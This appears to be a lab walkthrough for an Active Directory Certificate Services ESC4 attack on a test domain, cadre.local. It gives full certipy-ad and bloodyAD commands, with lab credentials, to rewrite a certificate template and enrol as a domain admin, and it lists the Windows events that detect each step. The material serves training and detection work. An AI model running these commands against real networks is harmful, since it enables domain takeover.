# WT#053 — ESC4: Writable Template ACL

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10) |
| **Domain** | cadre.local |
| **CA** | cadre-CA |
| **Template** | CADRE-ESC4 |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | certipy-ad, bloodyAD |
| **Certifications** | ADCS |
| **MITRE ATT&CK** | T1649 |
| **Difficulty** | Hard |

## Prerequisites
- CA service running on dc01
- `CADRE-ESC4` template published
- `Engineering-Cadre` group (containing `analyst_dfir`) has `WriteDacl` on `CADRE-ESC4`
- `analyst_dfir` is member of `Engineering-Cadre`

## Attack Steps

### 1. Verify WriteDacl on template
```powershell
bloodyAD --host 192.168.77.10 -d cadre.local -u analyst_dfir -p 'An@lyst_DF1R!' get object "CN=CADRE-ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=cadre,DC=local" --attr nTSecurityDescriptor
```

### 2. Modify template to enable enrollee-supplies-subject
```powershell
certipy-ad template -template CADRE-ESC4 -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
```

Or with bloodyAD:
```powershell
bloodyAD --host 192.168.77.10 -d cadre.local -u analyst_dfir -p 'An@lyst_DF1R!' set object "CN=CADRE-ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=cadre,DC=local" msPKI-Certificate-Name-Flag 1
```

### 3. Enroll modified template with DA UPN
```powershell
certipy-ad req -ca cadre-CA -template CADRE-ESC4 -upn chief_command@cadre.local -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
```

### 4. Authenticate as DA
```powershell
certipy-ad auth -pfx chief_command.pfx -dc-ip 192.168.77.10 -domain cadre.local
```

## Post-Exploitation Chain
ESC4 → Template ACL abuse → DA certificate → DCSync (WT#009) → Full domain compromise (cadre.local)

## Telemetry Verification
- **Event 5136**: Directory service attribute modification (`msPKI-Certificate-Name-Flag`, `nTSecurityDescriptor`)
- **Event 4662**: WriteDacl operation on CADRE-ESC4 template
- **Event 4887/4889**: Certificate enrollment after template modification
- **Sysmon Event 1**: certipy-ad, bloodyAD process creation
## Status
CONFIGURED — CA cadre-CA running, ESC4 WriteDacl ACL verified
